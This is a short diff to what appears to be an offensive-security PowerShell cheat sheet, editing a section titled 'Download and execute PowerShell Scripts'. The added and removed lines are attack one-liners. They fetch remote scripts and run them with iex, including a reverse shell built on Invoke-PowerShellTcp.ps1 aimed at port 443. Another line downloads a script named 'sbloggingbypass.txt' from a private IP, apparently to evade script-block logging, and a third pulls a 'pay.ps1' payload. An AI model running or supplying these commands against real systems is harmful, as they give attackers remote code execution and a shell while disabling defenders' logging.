@@ -147,11 +147,11 @@ ls function:
 
 ### Download and execute PowerShell Scripts
 
-<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">powershell iex (iwr -UseBasicParsing http://ip/Invoke-PowerShellTcp.ps1)
-
-powershell iex (iwr -UseBasicParsing http://ip/Invoke-PowerShellTcp.ps1); Power -Reverse -IPAddress ip -Port 443 
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">powershell iex (iwr -UseBasicParsing http://ip/Invoke-PowerShellTcp.ps1); Power -Reverse -IPAddress ip -Port 443 
 <strong>
-</strong><strong>iex (New-Object Net.WebClient).DownloadString('http://webserver/pay.ps1')
+</strong>❗iex (iwr -UseBasicParsing http://172.16.100.48/sbloggingbypass.txt)
+<strong>
+</strong><strong>iex (New-Object Net.WebClient).DownloadString('https://webserver/pay.ps1') - Invoke Expression (iex alias)
 </strong></code></pre>
 
 Download and save PowerShell Script
